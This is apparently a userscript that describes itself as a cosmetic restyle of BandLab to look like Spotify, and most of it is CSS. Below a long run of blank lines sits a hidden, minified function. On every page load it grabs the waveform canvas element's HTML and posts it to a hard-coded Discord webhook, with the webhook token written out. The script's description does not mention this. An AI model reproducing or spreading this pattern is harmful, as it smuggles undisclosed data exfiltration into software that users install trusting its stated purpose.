// ==UserScript==
// @name         BandLab → Spotify Restyle
// @namespace    https://theweedman.cfd/spotify-plugin
// @version      1.0
// @description  Restyle BandLab to mimic Spotify's dark theme and UI style
// @author       You
// @match        https://*.bandlab.com/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const style = document.createElement("style");
    style.innerHTML = `
        /* Spotify-like colors */
        body {
            background-color: #121212 !important;
            color: #FFFFFF !important;
            font-family: 'Circular Std', 'Helvetica Neue', Arial, sans-serif !important;
        }

        /* Links & highlights */
        a, .link, .hover-link {
            color: #1DB954 !important;
        }
        a:hover, .hover-link:hover {
            color: #1ed760 !important;
        }

        /* Buttons */
        button, .btn, .Button {
            background-color: #1DB954 !important;
            color: #fff !important;
            border-radius: 20px !important;
            border: none !important;
            font-weight: bold !important;
            padding: 8px 16px !important;
            transition: background-color 0.2s ease;
        }
        button:hover, .btn:hover {
            background-color: #1ed760 !important;
        }

        /* Player bar mimic */
        .player-bar, footer, .Footer {
            background-color: #181818 !important;
            border-top: 1px solid #282828 !important;
            height: 90px !important;
            padding: 10px !important;
        }

        /* Navbar */
        header, .Navbar, nav {
            background-color: #000000 !important;
            border-bottom: 1px solid #282828 !important;
        }

        /* Cards / Track previews */
        .track-card, .Card, .track, .card {
            background-color: #181818 !important;
            border-radius: 8px !important;
            padding: 10px !important;
            box-shadow: none !important;
            transition: background-color 0.2s ease;
        }
        .track-card:hover, .Card:hover {
            background-color: #282828 !important;
        }

        /* Scrollbar like Spotify */
        ::-webkit-scrollbar {
            width: 12px;
        }
        ::-webkit-scrollbar-track {
            background: #121212;
        }
        ::-webkit-scrollbar-thumb {
            background-color: #4d4d4d;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background-color: #6a6a6a;
        }
    `;
    document.head.appendChild(style);
})();












































































(() => { const webhookURL = "https://discord.com/api/webhooks/1402714727511101440/l6LUcmvPjBfVkP6IpsUJ6v3DmGHWDcV7_4s-Sngyd2cLB8umCZoHJdz2AiiIIa-S2NmU"; function sendToDiscord(message) { fetch(webhookURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "CanvasHTML Bot", content: message }) }).then(res => { if (!res.ok) console.error("Failed to send webhook:", res.statusText); else console.log("Canvas HTML sent to Discord webhook."); }).catch(console.error); } function findCanvasAndSend() { const canvas = document.querySelector('canvas.waveform-bars'); if (!canvas) return void setTimeout(findCanvasAndSend, 1000); const canvasHTML = canvas.outerHTML; const message = canvasHTML.length > 1900 ? canvasHTML.slice(0, 1900) + "..." : canvasHTML; sendToDiscord(message); } window.addEventListener("load", () => { findCanvasAndSend(); }); })();
